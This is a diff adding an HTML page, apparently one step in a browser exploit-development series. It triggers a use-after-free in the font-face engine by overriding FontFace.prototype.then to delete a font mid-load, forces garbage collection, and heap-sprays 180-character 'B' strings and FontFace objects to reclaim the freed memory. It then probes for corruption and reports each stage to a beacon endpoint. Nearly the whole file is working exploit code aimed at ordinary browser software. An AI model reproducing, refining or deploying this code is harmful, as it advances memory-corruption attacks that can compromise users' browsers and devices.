@@ -1,0 +1,219 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1152</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body>
+<canvas id="cv" width="400" height="50" style="display:none"></canvas>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1152: STALE RECLAIM VERIFICATION ===');
+log('info','P1151 confirmed: thenable reject + 5s GC = wrapper COLLECTED');
+log('info','Now: verify CSSFontFace freed, spray to reclaim, detect corruption');
+B('P1152-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var weakFF=null;
+var deleteResult='?';
+var sizeBeforeDel=-1,sizeAfterDel=-1;
+
+// Create font
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+// WeakRef + FinalizationRegistry
+weakFF=new WeakRef(ff);
+var frFired=false;
+var fr=new FinalizationRegistry(function(tag){
+  frFired=true;
+  B('P1152-FR','tag='+tag);
+});
+fr.register(ff,'ff-'+r);
+
+// === THENABLE REJECT PATTERN (proven in P1151) ===
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;
+  uafHit=true;
+
+  var self=this;
+  return function(resolve,reject){
+    // Diagnostic: check set membership BEFORE delete
+    sizeBeforeDel=document.fonts.size;
+    // Delete from set
+    if(st.parentNode)st.remove();
+    try{deleteResult=document.fonts.delete(self);}catch(e){deleteResult='ERR:'+e.message;}
+    sizeAfterDel=document.fonts.size;
+    document.body.offsetHeight;
+    B('P1152-DEL','result='+deleteResult+'|before='+sizeBeforeDel+'|after='+sizeAfterDel);
+    self=null;
+    reject(new Error('freed'));
+  };
+},set:function(){}});
+
+ff=null; // drop strong ref
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(
+  function(arr){B('P1152-LOAD','resolved|len='+(arr?arr.length:'?'));},
+  function(e){B('P1152-LOAD','rejected|msg='+e.message);}
+);
+
+// === PHASE 1: Immediate diagnostics (200ms) ===
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!uafHit){B('P1152-DONE','nohit');return;}
+
+  // Check set state
+  var sz=document.fonts.size;
+  var hasFnt=false;
+  try{document.fonts.forEach(function(f){
+    if(f.family==='y'+r||f.family==='z'+r)hasFnt=true;
+  });}catch(e){}
+  var chk='';
+  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='err';}
+  B('P1152-P1','wr=alive|sz='+sz+'|hasFont='+hasFnt+'|check='+chk+
+    '|del='+deleteResult+'|szBefore='+sizeBeforeDel+'|szAfter='+sizeAfterDel);
+
+  // Measure text with freed font vs fallback
+  var cv=document.getElementById('cv');
+  var ctx=cv.getContext('2d');
+  ctx.font='16px monospace';
+  var wMono=ctx.measureText('ABCDEFGHIJ').width;
+  ctx.font='16px "y'+r+'", monospace';
+  var wFreed=ctx.measureText('ABCDEFGHIJ').width;
+  ctx.font='16px Arial, monospace';
+  var wArial=ctx.measureText('ABCDEFGHIJ').width;
+  B('P1152-MEASURE','mono='+wMono+'|freed='+wFreed+'|arial='+wArial);
+},200);
+
+// === PHASE 2: Wait 6 seconds + GC to free wrapper (proven timeline) ===
+setTimeout(function(){
+  // Heavy GC pressure (same pattern that freed wrapper in P1151)
+  var trash=[];
+  for(var g=0;g<1000;g++)trash.push(new ArrayBuffer(4096));
+  trash=null;
+  for(var g=0;g<10000;g++){var tmp=String(g).repeat(100);tmp=null;}
+  for(var g=0;g<5000;g++){var tmp2={a:new Array(200)};tmp2=null;}
+
+  var wr='no';
+  try{var d=weakFF.deref();wr=d?'alive':'collected';}catch(e){wr='err';}
+  B('P1152-P2-GC','wr='+wr+'|fr='+frFired);
+
+  if(wr!=='collected'){
+    // More GC
+    for(var g=0;g<5000;g++){var tmp3=new ArrayBuffer(512);tmp3=null;}
+    for(var g=0;g<20000;g++){var tmp4={x:g};tmp4=null;}
+    try{var d2=weakFF.deref();wr=d2?'alive':'collected';}catch(e){wr='err';}
+    B('P1152-P2-GC2','wr='+wr);
+  }
+
+  if(wr!=='collected'){
+    B('P1152-FAIL','wrapper not collected at 6s');
+    // Still do the checks
+  }
+
+  // === PRE-SPRAY: Check fonts.check and set state ===
+  var preChk='';
+  try{preChk=document.fonts.check('1em y'+r);}catch(e){preChk='err';}
+  var preSz=document.fonts.size;
+  B('P1152-PRE-SPRAY','check='+preChk+'|sz='+preSz+'|wr='+wr);
+
+  // === SPRAY A: Strings targeting 192B bmalloc zone ===
+  // StringImpl: 12B header + N chars. For 192B total: N=180 chars
+  // Fill with 0x42 ('B') so pointers at CSSFontFace offsets become 0x4242424242424242
+  log('phase','--- Spray A: 2000 x 180-char strings ---');
+  B('P1152-SPRAY-A-PRE','sending beacon before spray');
+  var strSpray=[];
+  for(var k=0;k<2000;k++){
+    // Each string is exactly 180 chars of 'B' with a unique prefix
+    // Prefix is short (4 chars) so it doesn't affect the key offsets
+    var s='B'.repeat(180);
+    strSpray.push(s);
+  }
+  B('P1152-SPRAY-A','count='+strSpray.length);
+
+  // Check fonts.check AFTER string spray
+  var postChkA='';
+  try{postChkA=document.fonts.check('1em y'+r);}catch(e){postChkA='ERR:'+e.message.substring(0,30);}
+  B('P1152-POST-SPRAY-A','check='+postChkA);
+
+  // === SPRAY B: FontFace same-type objects (added to set) ===
+  log('phase','--- Spray B: 200 FontFace objects added to fonts set ---');
+  var ffSpray=[];
+  var wts=['100','200','300','400','500','600','700','800','900'];
+  for(var k=0;k<200;k++){
+    try{
+      var name='q'+r+'x'+k;
+      var nf=new FontFace(name,'local(Arial)',{weight:wts[k%9]});
+      document.fonts.add(nf);
+      ffSpray.push({ff:nf,name:name});
+    }catch(e){}
+  }
+  B('P1152-SPRAY-B','count='+ffSpray.length+'|fontsSize='+document.fonts.size);
+
+  // Check fonts.check AFTER FontFace spray
+  var postChkB='';
+  try{postChkB=document.fonts.check('1em y'+r);}catch(e){postChkB='ERR:'+e.message.substring(0,30);}
+  B('P1152-POST-SPRAY-B','check='+postChkB);
+
+  // Check if any spray FontFace has corrupted properties
+  var corrupt=0;
+  for(var k=0;k<ffSpray.length;k++){
+    var s=ffSpray[k];
+    try{if(s.ff.family!==s.name)corrupt++;}catch(e){corrupt++;}
+  }
+  B('P1152-FF-CORRUPT','corrupt='+corrupt+'/'+ffSpray.length);
+
+  // === DEEP ACCESS: Force engine to resolve the freed font ===
+  log('phase','--- Deep access: canvas measureText with freed font ---');
+  B('P1152-DEEP-PRE','about to measureText with freed font');
+  var cv=document.getElementById('cv');
+  var ctx=cv.getContext('2d');
+
+  // Baseline with known font
+  ctx.font='16px monospace';
+  var wBase=ctx.measureText('ABCDEFGHIJ').width;
+
+  // Freed font - this forces font resolution through the cascade
+  ctx.font='16px "y'+r+'", monospace';
+  var wFreed=ctx.measureText('ABCDEFGHIJ').width;
+
+  // Arial for comparison
+  ctx.font='16px Arial';
+  var wArial=ctx.measureText('ABCDEFGHIJ').width;
+
+  B('P1152-MEASURE-POST','base='+wBase+'|freed='+wFreed+'|arial='+wArial);
+
+  // === ITERATION: Walk document.fonts to find stale entries ===
+  var fontList=[];
+  try{document.fonts.forEach(function(f){
+    var fam='',stat='';
+    try{fam=f.family;}catch(e){fam='ERR';}
+    try{stat=f.status;}catch(e){stat='ERR';}
+    fontList.push(fam+':'+stat);
+  });}catch(e){fontList.push('ITER_ERR:'+e.message.substring(0,30));}
+
+  // Check if freed font name appears in iteration
+  var foundFreed=false;
+  for(var i=0;i<fontList.length;i++){
+    if(fontList[i].indexOf('y'+r)>=0||fontList[i].indexOf('z'+r)>=0){
+      foundFreed=true;
+      break;
+    }
+  }
+  B('P1152-ITER','total='+fontList.length+'|foundFreed='+foundFreed);
+  // Send first few entries
+  B('P1152-ITER-HEAD',fontList.slice(0,5).join('|'));
+
+  // === SUMMARY ===
+  var sum='wr='+wr+'|del='+deleteResult+'|preChk='+preChk+
+    '|postA='+postChkA+'|postB='+postChkB+'|corrupt='+corrupt+
+    '|wBase='+wBase+'|wFreed='+wFreed+'|foundFreed='+foundFreed;
+  B('P1152-SUMMARY',sum);
+  B('P1152-DONE','complete');
+},6000);
+</script></body></html>
